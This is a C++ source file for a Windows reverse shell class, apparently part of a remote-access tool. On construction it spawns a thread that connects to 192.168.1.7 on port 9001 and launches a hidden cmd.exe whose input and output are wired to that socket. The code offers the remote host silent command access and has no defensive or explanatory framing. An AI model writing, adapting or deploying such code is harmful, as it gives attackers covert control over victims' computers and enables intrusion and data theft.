#pragma once
#include "shell.h"


static SOCKET sReverseShellSocket;
STARTUPINFO SINFO = { 0 };
PROCESS_INFORMATION PI = { 0 };
static std::thread t;

Shell::Shell() {

	t = std::thread(&Shell::StartShell);

}

Shell::~Shell() {

	CloseHandle(PI.hProcess);
	CloseHandle(PI.hThread);
	closesocket(sReverseShellSocket);
	t.detach();
}

bool Shell::StartShell() {

	sReverseShellSocket = StartSocket::Connect(L"192.168.1.7", (short)9001);

	wchar_t lpCommandLine[] = L"cmd.exe";

	SINFO.cb = sizeof(STARTUPINFO);
	SINFO.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	SINFO.hStdInput = (HANDLE)sReverseShellSocket;
	SINFO.hStdOutput = (HANDLE)sReverseShellSocket;
	SINFO.hStdError = (HANDLE)sReverseShellSocket;

	if (!CreateProcessW(NULL, lpCommandLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &SINFO, &PI)) {
		printf("CreateProcess failed! ERROR 0x%d\n", GetLastError());
	}

	WaitForSingleObject(PI.hProcess, INFINITE);
	
	return TRUE;
}